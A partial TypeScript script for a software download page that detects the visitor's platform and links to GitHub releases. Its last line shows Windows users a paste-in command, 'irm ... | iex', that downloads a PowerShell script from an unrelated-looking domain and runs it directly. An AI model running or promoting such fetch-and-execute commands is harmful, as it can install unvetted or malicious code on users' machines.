...
import "./site.css";
import "./shell";
import { architectureFromUserAgent, assetForPlatform, loadReleaseMetadata, platformFromUserAgent, RELEASE_PAGE, type Architecture, type Platform } from "./releases";

const rootDemo = location.pathname === "/" && new URLSearchParams(location.search).get("demo") === "1";
if (rootDemo) location.replace("/demo/?demo=1");
...
if (download) {
  download.textContent = `Choose a ${names[platform]} build on GitHub ↗`;
  download.setAttribute("aria-label", `Choose a ${names[platform]} build on GitHub (external)`);
}
...
async function detectedArchitecture(): Promise<Architecture | undefined> {
  ...
  return architectureFromUserAgent(navigator.userAgent);
}
...
if (download && status && !rootDemo) void Promise.all([loadReleaseMetadata(fetch, localStorage), detectedArchitecture()]).then(([release, architecture]) => {
  ...
  download.setAttribute("aria-label", `Download for ${names[platform]} ${architecture === "arm64" ? "ARM64" : "x64"} from GitHub (external)`);
...
else if (status && !rootDemo) status.textContent = "Downloads are available on the release page.";

const installCommand = document.querySelector("#install-command");
if (isWindows && installCommand) installCommand.textContent = "irm https://caption-placement-check.sociobot.in/install.ps1 | iex";
